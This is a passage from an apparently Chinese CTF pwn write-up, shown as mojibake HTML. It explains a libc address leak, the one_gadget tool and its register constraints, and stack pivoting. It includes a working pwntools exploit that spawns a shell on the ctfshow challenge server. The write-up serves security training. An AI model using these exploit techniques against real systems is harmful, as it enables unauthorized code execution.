&lt;p&gt;IDA64åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261.png&#34;
	width=&#34;1070&#34;
	height=&#34;506&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261_hu_fb268501c613659a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261_hu_626707aef074ad69.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;507px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¼€å±€ç›´æ¥æ³„éœ²äº†pringtfçš„åœ°å€æˆ‘ä»¬ï¼Œä½†å› ä¸ºåœ°å€åŠ¨æ€å˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³„éœ²libcåº“åœ°å€ï¼Œç®—å‡ºè¿™ä¸ªç¨‹åºçš„å‡½æ•°åç§»é‡ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ __isoc99_scanf å‡½æ•°ä»ç”¨æˆ·è¾“å…¥ä¸­è¯»å–ä¸€ä¸ªé•¿æ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å†å°† v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™äº†æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚ç»§ç»­é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨äº† v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ‰€æŒ‡å‘çš„å‡½æ•°ã€‚è¿™ä¸ªéƒ¨åˆ†åˆ©ç”¨å‡½æ•°æŒ‡é’ˆçš„ç‰¹æ€§ï¼Œå°†å…¶è½¬æ¢ä¸ºå‡½æ•°å¹¶è¿›è¡Œè°ƒç”¨ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•ææœ‰å¯èƒ½ä¼šå¸¦æ¥å®‰å…¨éšæ‚£ï¼Œå› ä¸ºæ¶æ„ç”¨æˆ·å¯ä»¥è¾“å…¥ä¸å®‰å…¨çš„å‡½æ•°æŒ‡é’ˆï¼Œå¯¼è‡´ç¨‹åºå‡ºç°é—®é¢˜ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;åˆ°è¿™é‡Œå¼•å‡ºä¸‹ä¸€ä¸ªæ”»å‡»æ‰‹æ®µâ€”â€”one gadget&lt;/p&gt;
&lt;p&gt;one_gadgetæ˜¯libcä¸­å­˜åœ¨çš„ä¸€äº›æ‰§è¡Œexecve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL)çš„ç‰‡æ®µï¼Œå½“å¯ä»¥æ³„éœ²libcåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“libcç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥å¿«é€Ÿæ§åˆ¶æŒ‡ä»¤å¯„å­˜å™¨å¼€å¯shellã€‚&lt;/p&gt;
&lt;p&gt;ç›¸æ¯”äºsystem(&amp;quot;/bin/sh&amp;quot;)ï¼Œè¿™ç§æ–¹å¼æ›´åŠ æ–¹ä¾¿ï¼Œä¸ç”¨æ§åˆ¶RDIã€RSIã€RDXç­‰å‚æ•°ã€‚è¿ç”¨äºä¸åˆ©æ„é€ å‚æ•°çš„æƒ…å†µã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;one_gadget /lib/x86_64-linux-gnu/libc.so.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262.png&#34;
	width=&#34;899&#34;
	height=&#34;375&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262_hu_88cc34031fb4af00.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262_hu_4a5d6ba47111a871.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;239&#34;
		data-flex-basis=&#34;575px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;one_gadgetå¹¶ä¸æ€»æ˜¯å¯ä»¥è·å–shellï¼Œå®ƒé¦–å…ˆè¦æ»¡è¶³ä¸€äº›æ¡ä»¶æ‰èƒ½æ‰§è¡ŒæˆåŠŸ,åé¢æç¤ºå°±æ˜¯åœ¨è°ƒç”¨one_gadgetå‰éœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;çº¦æŸæ¡ä»¶æ»¡è¶³&lt;/strong&gt;ï¼šone - gadget æ˜¯ libc ä¸­æ‰§è¡Œ&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL)&lt;/code&gt;çš„ä»£ç ç‰‡æ®µï¼Œä½†éœ€è¦æ»¡è¶³ç‰¹å®šçº¦æŸæ¡ä»¶æ‰èƒ½æ‰§è¡ŒæˆåŠŸã€‚&lt;code&gt;0x4f2c5&lt;/code&gt;çš„çº¦æŸæ¡ä»¶ä¸º&lt;code&gt;rsp &amp;amp; 0xf == 0&lt;/code&gt;ä¸”&lt;code&gt;rcx == NULL&lt;/code&gt; ï¼Œ&lt;code&gt;0x4f322&lt;/code&gt;çš„çº¦æŸæ¡ä»¶ä¸º&lt;code&gt;[rsp + 0x40] == NULL&lt;/code&gt; ï¼Œ&lt;code&gt;0x10a2fc&lt;/code&gt;çš„çº¦æŸæ¡ä»¶ä¸º&lt;code&gt;[rsp + 0x70] == NULL&lt;/code&gt;ã€‚åœ¨ PWN074 åœºæ™¯ä¸­ï¼Œç¨‹åºæ ˆå¸ƒå±€ä½¿å¾—&lt;code&gt;[rsp + 0x70]&lt;/code&gt;å¤©ç„¶ä¸º NULLï¼ˆå› ä¸ºè¯¥åœ°å€è¶…å‡ºå½“å‰å‡½æ•°æ ˆå¸§èŒƒå›´ï¼Œå±äºæœªä½¿ç”¨çš„ç©ºé—²æ ˆåŒºåŸŸï¼Œåœ¨ Linux ç³»ç»Ÿä¸­é»˜è®¤å¡«å……ä¸º 0ï¼‰ ï¼Œæ»¡è¶³&lt;code&gt;0x10a2fc&lt;/code&gt;çš„çº¦æŸæ¡ä»¶ï¼Œè€Œå…¶ä»–ä¸¤ä¸ªåœ°å€çš„çº¦æŸæ¡ä»¶éš¾ä»¥æ»¡è¶³ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;rsp &amp;amp; 0xf == 0&lt;/code&gt;è¦æ±‚æ ˆæŒ‡é’ˆä½ 4 ä½ä¸º 0ï¼Œåœ¨ç¨‹åºæœªæä¾›è°ƒæ•´æ ˆæŒ‡é’ˆå¯¹é½çš„å¯æ§é€”å¾„æ—¶ï¼Œå¾ˆéš¾å®ç°ï¼›åŒæ—¶ç¨‹åºæœªå¯¹&lt;code&gt;rcx&lt;/code&gt;å¯„å­˜å™¨è¿›è¡Œæ§åˆ¶ï¼Œ&lt;code&gt;rcx&lt;/code&gt;å¤§æ¦‚ç‡ä¸ä¸º NULLï¼Œä¸æ»¡è¶³&lt;code&gt;0x4f2c5&lt;/code&gt;çš„æ¡ä»¶ï¼›&lt;code&gt;[rsp + 0x40]&lt;/code&gt;åœ¨ç¨‹åºè¿è¡Œæ—¶å­˜å‚¨æœ‰ä¸´æ—¶æ•°æ®ï¼Œæ— æ³•é€šè¿‡ç”¨æˆ·è¾“å…¥æ¸…ç©ºï¼Œä¸æ»¡è¶³&lt;code&gt;0x4f322&lt;/code&gt;çš„æ¡ä»¶ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æœ¬é¢˜ä»…ä»…æ˜¯ä¸€ä¸ªå·¥å…·å¼•è¿›ä½¿ç”¨ï¼Œå…·ä½“å¯ä»¥è‡ªè¡Œè°ƒè¯•ä¸€ä¸‹ä¾¿çŸ¥ã€‚çœäº†å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´å’Œç²¾åŠ›ï¼Œå¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œ&lt;strong&gt;libcç‰ˆæœ¬æ˜¯ä¸ªå‘&lt;/strong&gt;ã€‚å› æ­¤åœ¨è®­ç»ƒé¢˜å‹ä¸Šå¹³å°ä¸€èˆ¬å¼„äº†å‡ ä¸ªæ¯”è¾ƒç›¸å¯¹å›ºå®šçš„libcç‰ˆæœ¬ï¼Œ&lt;strong&gt;å®é™…æ¯”èµ›æ—¶libcçš„ç‰ˆæœ¬æ›´åŠ å¤šæ ·å¤æ‚&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œåœ¨è¿™é‡Œå¦‚æœä¸æ˜¯ä½¿ç”¨çš„é™„å¸¦è™šæ‹Ÿæœºï¼Œåˆ™éœ€è¦è‡ªè¡Œå»æ³„æ¼libcï¼Œå½“ç„¶å‰é¢ç»è¿‡è¿™ä¹ˆå¤šé¢˜çš„ç»ƒä¹ ï¼Œç›¸ä¿¡è¿™äº›ä¹Ÿæ˜¯æ²¡éš¾åº¦äº†ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28135&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;one_gadget&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10a2fc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;printf_libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;printf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;this:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;printf_libc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;one_gadget&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;one_gadget + libc_base&lt;/code&gt;&lt;/strong&gt;ï¼šè®¡ç®—å¾—åˆ° one_gadget åœ¨å†…å­˜ä¸­çš„&lt;strong&gt;çœŸå®åœ°å€&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;*&lt;strong&gt;&lt;code&gt;str(one_gadget+libc_base)&lt;/code&gt;&lt;/strong&gt;ï¼š&lt;code&gt;one_gadget + libc_base&lt;/code&gt; æ˜¯åè¿›åˆ¶æ•´æ•°ï¼‰ï¼Œ&lt;code&gt;main&lt;/code&gt; å‡½æ•°æ˜ç¡®ä½¿ç”¨ &lt;code&gt;__isoc99_scanf(&amp;quot;%ld&amp;quot;, v4)&lt;/code&gt; è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¯´è¦çš„æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä¸è¦æ•°å€¼æœ¬èº«çš„æ„ä¹‰ã€‚ï¼ˆone_gadget çœŸå®åœ°å€ä¸º &lt;code&gt;0x7f8a9b12d95c&lt;/code&gt;ï¼ˆåè¿›åˆ¶æ•°å€¼ä¸º &lt;code&gt;140239165128028&lt;/code&gt;ï¼‰ï¼Œç¨‹åºè¦æ±‚è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸² &lt;code&gt;&amp;quot;140239165128028&amp;quot;&lt;/code&gt;ï¼Œè€Œéæ•°å€¼&lt;code&gt;140239165128028&lt;/code&gt; æœ¬èº«ï¼‰å¤§æ¦‚å°±è¿™ä¹ˆç†è§£ï¼Œè¿™æ˜¯pythonçš„è‡ªèº«è§„åˆ™ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ˆè¿ç§»&#34;&gt;&lt;strong&gt;æ ˆè¿ç§»&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;æ ˆè¿ç§»æ˜¯åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼ˆå°¤å…¶æ˜¯æ ˆæº¢å‡ºæ¼æ´åœºæ™¯ï¼‰ä¸­å¸¸ç”¨çš„ä¸€ç§æŠ€æœ¯æ‰‹æ®µï¼Œç›®çš„æ˜¯æ”¹å˜ç¨‹åºæ‰§è¡Œæ—¶æ ˆçš„å¸ƒå±€å’Œæ‰§è¡Œæµç¨‹ï¼Œç»•è¿‡ä¸€äº›å®‰å…¨é˜²æŠ¤æœºåˆ¶ï¼Œ å®ç°æ”»å‡»è€…æƒ³è¦çš„ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„ç¨‹åºä¸­ï¼Œæ”»å‡»è€…åŸæœ¬å¯ä»¥é€šè¿‡è¦†ç›–è¿”å›åœ°å€æ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œè®©ç¨‹åºè·³è½¬åˆ°æ”»å‡»è€…æŒ‡å®šçš„åœ°å€ï¼ˆå¦‚ shellcode åœ°å€ï¼‰æ‰§è¡Œæ¶æ„ä»£ç ã€‚ä½†éšç€ç³»ç»Ÿå®‰å…¨æœºåˆ¶ï¼ˆå¦‚ NX ä¿æŠ¤ï¼Œä½¿æ ˆä¸Šæ•°æ®ä¸å¯æ‰§è¡Œ ï¼‰çš„å¼•å…¥æˆ–è€…æ ˆç©ºé—´è¿‡å°ï¼Œç›´æ¥åœ¨æ ˆä¸Šæ‰§è¡Œæ³¨å…¥çš„ shellcode å˜å¾—å›°éš¾ã€‚åŒæ—¶ï¼Œä¸€äº›ç¨‹åºè¿˜å¯èƒ½å­˜åœ¨æ ˆé‡‘ä¸é›€ä¿æŠ¤ï¼ˆStack Canaryï¼‰æ¥æ£€æµ‹æ ˆæ˜¯å¦è¢«éæ³•ç¯¡æ”¹ï¼Œè¿™ä¹Ÿå¢åŠ äº†ä¼ ç»Ÿæ ˆæº¢å‡ºåˆ©ç”¨çš„éš¾åº¦ã€‚å› æ­¤ï¼Œæ ˆè¿ç§»æŠ€æœ¯åº”è¿è€Œç”Ÿï¼Œä»¥ç»•è¿‡è¿™äº›å®‰å…¨é˜²æŠ¤ã€‚&lt;/p&gt;
&lt;h4 id=&#34;åŸç†&#34;&gt;åŸç†
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;æ”¹å˜æ ˆçš„ä½ç½®&lt;/strong&gt;ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œç¨‹åºæŒ‰ç…§é»˜è®¤çš„æ ˆå¸ƒå±€æ‰§è¡Œï¼Œæ ˆè¿ç§»çš„æ ¸å¿ƒæ˜¯å°†æ ˆçš„ä½ç½®ç§»åŠ¨åˆ°ä¸€ä¸ªå¯¹æ”»å‡»è€…æœ‰åˆ©çš„åœ°æ–¹ï¼Œæ¯”å¦‚å…·æœ‰å¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜åŒºåŸŸï¼ˆå¦‚ &lt;code&gt;bss&lt;/code&gt; æ®µï¼‰ ã€‚åœ¨æ ˆæº¢å‡ºæ¼æ´å‘ç”Ÿæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¦†ç›–æŸäº›å…³é”®å¯„å­˜å™¨ï¼ˆå¦‚ &lt;code&gt;esp&lt;/code&gt;ï¼Œåœ¨ 32 ä½ç¨‹åºä¸­ï¼›&lt;code&gt;rsp&lt;/code&gt;ï¼Œåœ¨ 64 ä½ç¨‹åºä¸­ ï¼‰çš„å€¼ï¼Œä½¿ç¨‹åºåœ¨åç»­æ‰§è¡Œä¸­ï¼Œå°†æ–°çš„æ ˆå¸§è®¾ç½®åœ¨æ”»å‡»è€…æŒ‡å®šçš„å†…å­˜ä½ç½®ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ„é€ æ–°æ ˆå¸§&lt;/strong&gt;ï¼šåœ¨æ–°çš„æ ˆä½ç½®ï¼Œæ”»å‡»è€…ç²¾å¿ƒæ„é€ æ ˆå¸§ï¼Œæ”¾ç½®éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ã€å‡½æ•°å‚æ•°ç­‰æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥å°† &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL)&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨çš„ç›¸å…³å‚æ•°å’ŒæŒ‡ä»¤åœ°å€æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ”¾ç½®åœ¨æ–°æ ˆå¸§ä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°ç›¸åº”æŒ‡ä»¤æ—¶ï¼Œå°±ä¼šæŒ‰ç…§æ”»å‡»è€…çš„æ„å›¾æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;pwn_075&#34;&gt;PWN_075
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæ ˆç©ºé—´ä¸å¤Ÿæ€ä¹ˆåŠï¼Ÿ &lt;a class=&#34;link&#34; href=&#34;PWN_075&#34; &gt;PWN_075&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278.png&#34;
	width=&#34;934&#34;
	height=&#34;205&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278_hu_e448f1b5f594d4c4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278_hu_7fdb3c9e6ab48043.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;455&#34;
		data-flex-basis=&#34;1093px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;32ä½å¼€å¯NXä¿æŠ¤ï¼Œéƒ¨åˆ†å¼€å¯RELROã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æï¼ŒæŸ¥çœ‹mainä¸­çš„ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279.png&#34;
	width=&#34;575&#34;
	height=&#34;229&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279_hu_d1c22ead98e69375.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279_hu_73a3be9205fd366f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;251&#34;
		data-flex-basis=&#34;602px&#34;
	
&gt;&lt;/p&gt;
